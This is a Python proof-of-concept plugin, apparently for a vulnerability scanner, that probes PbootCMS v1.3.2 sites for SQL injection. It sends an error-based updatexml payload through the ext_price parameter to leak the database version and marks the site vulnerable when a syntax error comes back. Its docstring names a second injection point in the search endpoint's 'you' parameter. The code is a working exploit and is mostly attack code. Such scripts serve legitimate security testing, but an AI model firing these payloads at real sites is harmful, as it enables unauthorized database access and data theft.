#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @author: 'orleven'

from lib.utils.connect import ClientSession
from lib.core.enums import VUL_LEVEL
from lib.core.enums import VUL_TYPE
from lib.core.enums import SERVICE_PORT_MAP
from script import Script

class POC(Script):
    '''
    PbootCMS v1.3.2命令执行
    另外还有 注入： PbootCMS/index.php/Search/index?keyword=pboot&you=gay  注入点在you，搜索型注入
    '''

    def __init__(self, target=None):
        self.service_type = SERVICE_PORT_MAP.WEB
        self.name = 'pbootcms 1.3.2 sql'
        self.keyword = ['pbootcms']
        self.info = 'PbootCMS v1.3.2 sql'
        self.type = VUL_TYPE.SQL
        self.level = VUL_LEVEL.HIGH
        Script.__init__(self, target=target, service_type=self.service_type)


    async def prove(self):
        await self.get_url()
        if self.base_url:
            async with ClientSession() as session:
                for path in  self.url_normpath(self.url, './PbootCMS/'):
                    poc = "index.php/Index?ext_price%3D1/**/and/**/updatexml(1,concat(0x7e,(SELECT/**/version()),0x7e),1));%23=123"
                    url = path + poc
                    async with session.get(url=url) as res:
                        if res !=None:
                            text = await res.text()
                            if "syntax" in text:
                                self.flag = 1
                                self.req.append({"url": url})
                                self.res.append({"info": url, "key": "pbootcms v1.3.2 sql"})
                                break